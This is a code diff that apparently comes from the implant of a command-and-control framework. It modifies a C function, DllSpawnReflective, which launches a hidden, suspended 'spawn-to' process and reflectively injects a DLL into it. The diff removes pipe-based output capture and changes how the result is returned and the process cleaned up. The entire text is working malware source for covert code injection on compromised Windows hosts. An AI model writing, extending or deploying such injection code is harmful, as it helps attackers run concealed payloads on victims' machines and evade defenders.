@@ -424,39 +424,33 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllBuffer, DWORD DllLen
     return FALSE;
 }
 
-BOOL DllSpawnReflective( LPVOID DllBuffer, DWORD DllLength, PVOID Parameter, SIZE_T ParamSize, PINJECTION_CTX ctx )
+DWORD DllSpawnReflective( LPVOID DllBuffer, DWORD DllLength, PVOID Parameter, SIZE_T ParamSize, PINJECTION_CTX ctx )
 {
     PRINTF( "Params( %x, %d, %x )\n", DllBuffer, DllLength, ctx );
 
-    ANONPIPE            AnonPipes   = { 0 };
     PROCESS_INFORMATION ProcessInfo = { 0 };
     PCHAR               SpawnProc   = NULL;
-
-    AnonPipesInit( &AnonPipes );
+    DWORD               Result      = NULL;
 
     if ( GetPeArch( DllBuffer ) == PROCESS_ARCH_X86 ) // check if dll is x64
         SpawnProc = Instance->Config.Process.Spawn86;
     else
         SpawnProc = Instance->Config.Process.Spawn64;
 
-    if ( ProcessCreate( TRUE, NULL, SpawnProc, CREATE_NO_WINDOW | CREATE_SUSPENDED, &ProcessInfo, FALSE, &AnonPipes ) )
+    if ( ProcessCreate( TRUE, NULL, SpawnProc, CREATE_NO_WINDOW | CREATE_SUSPENDED, &ProcessInfo, TRUE, NULL ) )
     {
-        if ( DllInjectReflective( ProcessInfo.hProcess, DllBuffer, DllLength, Parameter, ParamSize, ctx ) )
+        Result = DllInjectReflective( ProcessInfo.hProcess, DllBuffer, DllLength, Parameter, ParamSize, ctx );
+        if ( ! Result )
         {
-            Instance->Win32.NtClose( AnonPipes.StdOutWrite );
-            Instance->Win32.NtClose( AnonPipes.StdInRead );
-
-            AnonPipesRead( &AnonPipes );
-            AnonPipesClose( &AnonPipes );
+            PUTS( "Failed" )
 
             if ( ! Instance->Win32.TerminateProcess( ProcessInfo.hProcess, 0 ) )
-                PRINTF( "Failed to Terminate Process: %d\n", NtGetLastError()  )
+                PRINTF( "(Not major) Failed to Terminate Process: %d\n", NtGetLastError()  )
 
-            return TRUE;
+            Instance->Win32.NtClose( ProcessInfo.hProcess );
+            Instance->Win32.NtClose( ProcessInfo.hThread );
         }
-
-        if ( ! Instance->Win32.TerminateProcess( ProcessInfo.hProcess, 0 ) )
-            PRINTF( "Failed to Terminate Process: %d\n", NtGetLastError()  )
     }
-    return FALSE;
+
+    return Result;
 }
